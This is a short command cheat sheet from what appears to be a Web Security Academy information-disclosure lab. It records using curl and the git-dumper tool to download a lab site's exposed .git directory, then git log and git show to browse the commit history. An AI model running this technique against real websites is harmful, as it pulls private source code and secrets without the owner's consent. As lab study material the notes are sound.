# Information Disclosure — Scripts & Commands
> Only commands actually used during this session
> Tool: Git Bash on Windows

---

## ✅ Check curl (confirmed working)
```bash
curl --version
```

---

## ✅ Download a single .git file with curl
```bash
curl -O https://TARGET.web-security-academy.net/.git/HEAD
```

---

## ✅ Install git-dumper
```bash
pip install git-dumper
```

---

## ✅ Download entire .git folder with git-dumper
```bash
python -m git_dumper https://TARGET.web-security-academy.net/.git/ gitfiles
```
> Replace `gitfiles` with any folder name you want
> Replace the URL with your current lab URL

---

## ⏳ Next Steps (Not Done Yet — Complete the Lab)
```bash
# Go into the downloaded folder
cd gitfiles

# See all commits and history
git log

# See what changed in a specific commit
# Copy the commit ID from git log output
git show <commit_id>
```

---

## ❌ Did Not Work
```bash
wget   # not installed in Git Bash
```
